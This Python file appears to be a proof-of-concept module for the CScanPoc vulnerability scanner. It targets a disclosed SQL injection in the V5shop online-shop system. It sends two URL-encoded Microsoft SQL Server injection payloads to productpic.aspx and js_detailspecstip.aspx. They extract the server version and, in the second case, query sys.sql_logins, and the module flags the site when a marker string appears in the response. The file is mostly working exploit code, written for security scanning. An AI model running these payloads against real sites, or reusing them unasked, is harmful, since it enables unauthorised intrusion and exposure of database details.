# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'V5shop_0002'  # 平台漏洞编号，留空
    name = 'V5shop淘宝客系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-11-18'  # 漏洞公布时间
    desc = '''
        V5Shop网店系统是上海威博旗下一款B to C网上开店软件产品，适合中小型企业及个人快速构建个性化网上商店。上海威博创始于2002年，是中国最具技术实力、国内市场占有率最高的电子商务系统提供商之一。旗下拥有V5SHOP网店系统个人版、V5SHOP企业级电子商务系统标准版、V5SHOP企业级电子商务系统双核版、V5SHOP企业级电子商务系统全程版、V5MALL商城系统、V5SHOP多国语言系统、V5SHOP联盟系统以及众多网店辅助工具。
        V5shop网店建设系统/productpic.aspx, /js_detailspecstip.aspx 页面参数过滤不严谨，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=043187'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'V5shop'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'db97ce71-55cf-4c58-835a-6917e071fedd'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2013-043187
            path1 = '/productpic.aspx'
            payload1 = '?id=%28SELECT%20CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28@@version%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28113%29%29'
            verify_url1 = self.target + path1 + payload1
            r1 = requests.get(verify_url1)

            if 'qvkvqMicrosoft SQL Server' in r1.text:
                # security_hole(arg+path1)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            path2 = '/js_detailspecstip.aspx'
            payload2 = '?id=%28SELECT%20CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20TOP%201%20SUBSTRING%28%28ISNULL%28CAST%28@@version%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%20FROM%20sys.sql_logins%20WHERE%20ISNULL%28CAST%28name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20NOT%20IN%20%28SELECT%20TOP%200%20ISNULL%28CAST%28name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20sys.sql_logins%20ORDER%20BY%20name%29%20ORDER%20BY%20name%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28122%29%2BCHAR%28112%29%2BCHAR%28113%29%29'
            verify_url2 = self.target + path2 + payload2
            r2 = requests.get(verify_url2)

            if 'qvzbqMicrosoft SQL Server' in r2.text:
                # security_hole(arg+path2)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
